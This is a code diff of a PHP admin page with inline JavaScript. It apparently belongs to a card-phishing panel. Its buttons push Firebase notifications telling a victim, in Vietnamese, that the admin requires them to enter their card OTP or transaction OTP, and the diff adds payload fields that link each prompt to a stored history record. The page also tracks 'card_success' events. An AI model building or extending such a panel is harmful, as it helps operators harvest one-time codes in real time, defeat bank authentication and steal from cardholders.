@@ -249,7 +249,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             body: new URLSearchParams({
                 'token': '<?php echo htmlspecialchars($token_user); ?>', // Sử dụng token từ bảng history
                 'title': 'Thông báo từ admin',
-                'body': 'Admin yêu cầu bạn nhập mã OTP thẻ, hãy vào kiểm tra',
+                'body': JSON.stringify({
+                    'type': '0',
+                    'message': 'Admin yêu cầu bạn nhập mã OTP thẻ, hãy vào kiểm tra',
+                    'id_history': '<?php echo htmlspecialchars($id_history); ?>' // Truyền id_history vào đây
+                }),
                 'image': 'https://cdn.shopify.com/s/files/1/1061/1924/files/Sunglasses_Emoji.png?2976903553660223024'
             })
         })
@@ -263,6 +267,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 toastr.error('Đã xảy ra lỗi khi gửi thông báo.');
             });
     });
+
     document.getElementById('otpTransactionButton').addEventListener('click', function () {
         fetch('../../component/send.php', {
             method: 'POST',
@@ -272,7 +277,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             body: new URLSearchParams({
                 'token': '<?php echo htmlspecialchars($token_user); ?>', // Sử dụng token từ bảng history
                 'title': 'Thông báo từ admin',
-                'body': 'Admin yêu cầu bạn nhập mã OTP giao dịch, hãy vào kiểm tra',
+                'body': JSON.stringify({
+                    'type': '1',
+                    'message': 'Admin yêu cầu bạn nhập mã OTP giao dịch, hãy vào kiểm tra',
+                    'id_history': '<?php echo htmlspecialchars($id_history); ?>' // Truyền id_history vào đây
+                }),
                 'image': 'https://cdn.shopify.com/s/files/1/1061/1924/files/Sunglasses_Emoji.png?2976903553660223024'
             })
         })
@@ -286,6 +295,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 toastr.error('Đã xảy ra lỗi khi gửi thông báo.');
             });
     });
+
 
 </script>
 <script>
@@ -312,6 +322,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         toastr.success('<?php echo $_SESSION['card_success']; ?>');
         <?php unset($_SESSION['card_success']); ?>
     <?php endif; ?>
+</script>
+<script type="module">
+    import { handleOnMessage } from '/component/firebaseMessaging.js';
+    // Gọi hàm và truyền callback để xử lý thông báo
+    handleOnMessage((payload) => {
+        const notificationTitle = payload.notification.title || "Firebase Notification";
+        const notificationBody = payload.notification.body || "You have a new message.";
+
+        // Hiển thị thông báo qua alert hoặc bất kỳ UI nào bạn muốn
+        alert(`${notificationTitle}: ${notificationBody}`);
+    });
 </script>
 
 </html>
